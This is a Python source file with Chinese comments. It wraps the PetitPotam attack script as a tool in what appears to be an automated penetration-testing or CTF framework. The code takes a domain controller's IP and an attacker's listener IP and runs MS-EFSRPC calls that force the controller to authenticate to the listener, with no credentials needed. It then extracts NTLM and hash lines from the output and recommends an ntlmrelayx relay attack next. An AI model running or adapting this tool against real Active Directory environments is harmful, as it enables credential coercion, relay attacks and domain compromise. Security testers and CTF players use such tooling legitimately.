# tools/petitpotam_tool.py
"""
PetitPotam Tool - Active Directory 认证强制攻击工具

功能:
- MS-EFSRPC 协议利用
- 强制域控制器向攻击者发送认证
- 配合 NTLM Relay 攻击
- 域提权辅助

特点:
- 无需凭据即可利用
- 支持多种 EFSRPC 方法
- 可指定任意目标

CTF优化:
- 简化参数，一键触发
- 自动检测域控
"""
import os
import sys
import shutil
from typing import Dict, Any, List
from tool_framework import CommandLineTool


class PetitPotamTool(CommandLineTool):
    """
    PetitPotam AD认证强制攻击工具封装

    利用 MS-EFSRPC 协议强制域控制器认证
    """

    # 前置条件
    REQUIRES_CREDENTIALS = False  # 可无凭据利用
    REQUIRES_SHELL_SESSION = False
    TOOL_CATEGORY = "internal"  # 内网渗透工具

    def __init__(self):
        cmd = "python3" if os.path.exists("/.dockerenv") else sys.executable
        super().__init__(cmd)

        # 脚本路径
        docker_path = "/app/thirdparty/PetitPotam/PetitPotam.py"
        local_path = os.path.join(os.getcwd(), "thirdparty", "PetitPotam", "PetitPotam.py")
        self.script_path = docker_path if os.path.exists(docker_path) else local_path
        self.timeout = 120

    def name(self) -> str:
        return "petitpotam"

    def description(self) -> str:
        return "AD认证强制攻击工具，利用MS-EFSRPC协议强制域控向攻击者发送NTLM认证。"

    def supported_vulns(self) -> list:
        return [
            "Active Directory",
            "NTLM Relay",
            "EFSRPC",
            "Authentication Coercion",
            "Domain Escalation"
        ]

    def capability_statement(self) -> str:
        return "AD认证强制工具。输入域控IP和攻击者监听IP，强制域控发送NTLM认证。适合：域环境渗透、NTLM Relay前置。内网节点使用。"

    def check_available(self) -> bool:
        """检查 PetitPotam 是否可用"""
        if not shutil.which("python3" if os.path.exists("/.dockerenv") else "python"):
            return False
        return self.script_path is not None and os.path.exists(self.script_path)

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target": {
                "type": "str",
                "description": "目标域控制器IP或主机名",
                "required": True
            },
            "listener": {
                "type": "str",
                "description": "攻击者监听IP (接收NTLM认证)",
                "required": True
            },
            "method": {
                "type": "str",
                "description": "EFSRPC方法: EfsRpcOpenFileRaw (默认), EfsRpcEncryptFileSrv, others",
                "required": False,
                "default": "EfsRpcOpenFileRaw"
            },
            "domain": {
                "type": "str",
                "description": "域名 (可选)",
                "required": False
            },
            "username": {
                "type": "str",
                "description": "用户名 (如有凭据)",
                "required": False
            },
            "password": {
                "type": "str",
                "description": "密码 (如有凭据)",
                "required": False
            },
            "port": {
                "type": "int",
                "description": "目标端口 (默认445)",
                "required": False,
                "default": 445
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """
        执行 PetitPotam 攻击
        """
        target_dc = params.get("target") or target
        listener = params.get("listener")
        method = params.get("method", "EfsRpcOpenFileRaw")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        port = params.get("port", 445)

        if not target_dc:
            return {"error": "必须提供目标域控IP", "success": False}
        if not listener:
            return {"error": "必须提供攻击者监听IP", "success": False}

        if not self.check_available():
            return {
                "error": "PetitPotam 不可用，请检查安装",
                "success": False
            }

        # 构建命令
        cmd = [self.cmd_path, self.script_path]

        # 目标和监听者
        cmd.append(target_dc)
        cmd.append(listener)

        # 方法
        if method:
            cmd.extend(["-method", method])

        # 端口
        if port:
            cmd.extend(["-port", str(port)])

        # 认证信息
        if domain:
            cmd.extend(["-domain", domain])
        if username:
            cmd.extend(["-user", username])
        if password:
            cmd.extend(["-password", password])

        print(f"[PetitPotam] Executing: {' '.join(cmd)}")

        try:
            raw_result = self._run_command(cmd, timeout=self.timeout, stream_output=True)
            stdout = raw_result.get("stdout", "")
            stderr = raw_result.get("stderr", "")

            # 检测是否成功触发认证
            success_indicators = [
                "ntlm",
                "authentication",
                "successful",
                "got connection"
            ]

            is_success = any(indicator in stdout.lower() for indicator in success_indicators)

            # 提取 NTLM 信息
            ntlm_info = {}
            if "NTLM" in stdout:
                lines = stdout.split("\n")
                for line in lines:
                    if "NTLM" in line or "hash" in line.lower():
                        ntlm_info["line"] = line.strip()

            return {
                "success": is_success or raw_result.get("success", False),
                "target_dc": target_dc,
                "listener": listener,
                "method": method,
                "ntlm_captured": bool(ntlm_info),
                "ntlm_info": ntlm_info,
                "summary": f"PetitPotam 攻击{'成功' if is_success else '已执行'}",
                "next_steps": "建议配合 ntlmrelayx.py 进行 NTLM Relay 攻击" if is_success else "",
                "stdout": stdout
            }

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "target_dc": target_dc
            }


def register():
    """注册 PetitPotam 工具"""
    from tool_framework import ToolRegistry
    ToolRegistry.register(PetitPotamTool())